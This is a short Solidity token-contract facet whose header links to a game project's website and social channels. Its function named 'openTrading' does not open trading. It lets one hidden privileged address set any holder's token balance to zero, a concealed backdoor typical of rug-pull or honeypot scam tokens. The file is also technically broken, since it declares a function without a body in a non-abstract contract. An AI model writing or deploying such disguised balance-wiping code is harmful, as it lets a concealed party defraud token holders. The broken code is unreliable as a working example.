/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.eof.gg/?utm_source=icodrops
 * Twitter: https://twitter.com/Enginesoffury
 * Telegram: https://t.me/EnginesOfFury
 * Discord: http://discord.gg/eof
 * Youtube: https://www.youtube.com/watch?v=83vzEhRRhVI&t=1s
 */
pragma solidity ^0.8.21;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract getPairFacet {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function pancakePair() public view virtual returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            IPancakeFactory(ds.FACTORY).getPair(
                address(ds.WETH),
                address(this)
            );
    }
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ds.ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
}
